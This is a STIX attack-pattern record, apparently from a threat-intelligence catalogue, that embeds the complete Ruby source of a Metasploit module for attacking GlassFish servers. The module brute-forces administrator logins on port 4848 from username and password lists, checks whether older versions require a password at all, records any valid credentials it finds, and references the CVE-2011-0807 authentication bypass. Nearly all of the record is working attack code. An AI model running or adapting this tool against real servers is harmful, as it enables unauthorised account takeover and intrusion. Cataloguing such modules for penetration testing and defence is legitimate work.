{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77fe8258-185a-446f-bdbc-d6db3a74f49d",
    "created": "2024-08-14T16:29:59.290815Z",
    "modified": "2024-08-14T16:29:59.290819Z",
    "name": "GlassFish Brute Force Utility",
    "description": " This module attempts to login to GlassFish instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options. It will also try to do an authentication bypass against older versions of GlassFish. Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/glassfish_login.rb",
            "external_id": "glassfish_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0807"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/glassfish'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'GlassFish Brute Force Utility',\n      'Description'    => %q{\n        This module attempts to login to GlassFish instance using username and password\n        combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.\n        It will also try to do an authentication bypass against older versions of GlassFish.\n        Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option\n        to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.\n      },\n      'Author'         =>\n        [\n          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-0807'],\n          ['OSVDB', '71948']\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        # There is no TARGETURI because when Glassfish is installed, the path is /\n        Opt::RPORT(4848),\n        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  #\n  # Module tracks the session id, and then it will have to pass the last known session id to\n  # the LoginScanner class so the authentication can proceed properly\n  #\n\n  #\n  # For a while, older versions of Glassfish didn't need to set a password for admin,\n  # but looks like no longer the case anymore, which means this method is getting useless\n  # (last tested: Aug 2014)\n  #\n  def is_password_required?(version)\n    success = false\n\n    if version =~ /^[29]\\.x$/\n      res = send_request_cgi({'uri'=>'/applications/upload.jsf'})\n      p = /<title>Deploy Enterprise Applications\\/Modules/\n      if (res && res.code.to_i == 200 && res.body.match(p) != nil)\n        success = true\n      end\n    elsif version =~ /^3\\./\n      res = send_request_cgi({'uri'=>'/common/applications/uploadFrame.jsf'})\n      p = /<title>Deploy Applications or Modules/\n      if (res && res.code.to_i == 200 && res.body.match(p) != nil)\n        success = true\n      end\n    end\n\n    success\n  end\n\n\n  def init_loginscanner(ip)\n    @cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(\n      configure_http_login_scanner(\n        cred_details:       @cred_collection,\n        stop_on_success:    datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username:      datastore['HttpUsername'],\n        http_password:      datastore['HttpPassword']\n      )\n    )\n  end\n\n  def do_report(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      last_attempted_at: DateTime.now,\n      status: result.status\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def bruteforce(ip)\n    @scanner.scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n        do_report(ip, rport, result)\n      when Metasploit::Model::Login::Status::DENIED_ACCESS\n        print_brute :level => :status, :ip => ip, :msg => \"Correct credentials, but unable to login: '#{result.credential}'\"\n        do_report(ip, rport, result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n        end\n        invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n        )\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n        end\n        invalidate_login(\n            address: ip,\n            port: rport,\n            protocol: 'tcp',\n            public: result.credential.public,\n            private: result.credential.private,\n            realm_key: result.credential.realm_key,\n            realm_value: result.credential.realm,\n            status: result.status\n        )\n      end\n    end\n  end\n\n\n\n  #\n  # main\n  #\n  def run_host(ip)\n    init_loginscanner(ip)\n    msg = @scanner.check_setup\n    if msg\n      print_brute :level => :error, :ip => rhost, :msg => msg\n      return\n    end\n\n    print_brute :level=>:status, :ip=>rhost, :msg=>('Checking if Glassfish requires a password...')\n    if @scanner.version =~ /^[239]\\.x$/ && is_password_required?(@scanner.version)\n      print_brute :level => :good, :ip => ip, :msg => \"Note: This Glassfish does not require a password\"\n    else\n      print_brute :level=>:status, :ip=>rhost, :msg=>(\"Glassfish is protected with a password\")\n    end\n\n    bruteforce(ip) unless @scanner.version.blank?\n  end\nend\n"
}